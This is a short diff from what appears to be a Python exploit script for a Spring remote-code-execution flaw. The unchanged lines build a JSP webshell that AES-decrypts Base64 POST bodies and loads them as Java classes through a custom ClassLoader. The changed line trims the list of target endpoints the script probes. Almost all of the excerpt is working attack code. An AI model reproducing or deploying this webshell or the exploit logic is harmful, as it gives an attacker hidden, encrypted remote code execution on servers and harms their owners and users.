@@ -124,7 +124,7 @@ def spring_rce(alive_url):
     suffix = "%{" + random_str_1 + "}i"
     webshell = prefix + "@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"" + suffix + prefix + "!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}" + suffix + prefix + "if (request.getMethod().equals(\"POST\")){String k=\"" + shell_passwd + "\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);}" + suffix
 
-    endpoints = ["index", "login", "add", "uploadFile", "download", "SpringRCE_war/Test", ""]
+    endpoints = ["index", "login", "add", "uploadFile", "download", ""]
     urls = []
 
     header = {"User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
